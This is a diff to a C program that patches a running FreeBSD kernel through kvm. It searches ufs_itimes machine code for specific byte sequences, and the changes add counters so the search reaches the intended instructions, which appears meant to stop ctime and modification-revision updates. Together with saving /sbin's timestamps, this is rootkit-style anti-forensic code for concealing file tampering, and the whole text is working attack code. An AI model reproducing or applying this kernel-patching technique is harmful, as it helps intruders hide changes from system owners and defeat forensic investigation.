@@ -22,7 +22,7 @@ unsigned char nop3[] =
 
 int main (int argc, char *argv[])
 {
-	int i, offset1, offset2, offset3;
+	int i, offset1, offset2, offset3, count1, count2, count3;
 	char errbuf[_POSIX2_LINE_MAX];
 	kvm_t *kd;
 	struct nlist nl[] = { {NULL}, {NULL}, };
@@ -63,14 +63,25 @@ int main (int argc, char *argv[])
 	/* Search through ufs_itimes for the following three lines:
 	 * DIP_SET(ip, i_ctime, ts.tv_sec);
 	 * DIP_SET(ip, i_ctimensec, ts.tv_nsec);
-	 * DIP_SET(ip, i_modrev, DIP(ip, i_modrev) + 1); */
+	 * DIP_SET(ip, i_modrev, DIP(ip, i_modrev) + 1);
+	 *
+	 * However, the bytes \x49\x8b\x4e\x38 appear 11 times
+	 * before the instruction we want to nop. Similarly,
+	 * \x49\x8b\x46\x38 appears 1 time before the one we want.
+	 * Therefore, we have to keep looking until we find the 
+	 * right one. */
+	count1 = 0;	// Out of 11
+	count3 = 0;	// Out of 1
 	for ( i = 0 ; i < SIZE - 2 ; i++ )
 	{
 		if (	ufs_itimes_code[i] 	== 0x49 &&
 			ufs_itimes_code[i+1] 	== 0x8b &&
 			ufs_itimes_code[i+2] 	== 0x4e &&
 			ufs_itimes_code[i+3]	== 0x38)
-			offset1 = i;
+			if ( count1 == 11 )
+				offset1 = i;
+			else
+				count1++;
 
 		if (	ufs_itimes_code[i]	== 0x89 &&
 			ufs_itimes_code[i+1]	== 0x41 &&
@@ -81,7 +92,10 @@ int main (int argc, char *argv[])
 			ufs_itimes_code[i+1]	== 0x8b &&
 			ufs_itimes_code[i+2]	== 0x46 &&
 			ufs_itimes_code[i+3]	== 0x38)
-			offset3 = i;
+			if ( count3 == 1 )
+				offset3 = i;
+			else
+				count3++;
 	}
 
 	/* Save /sbin/'s access and modification times */
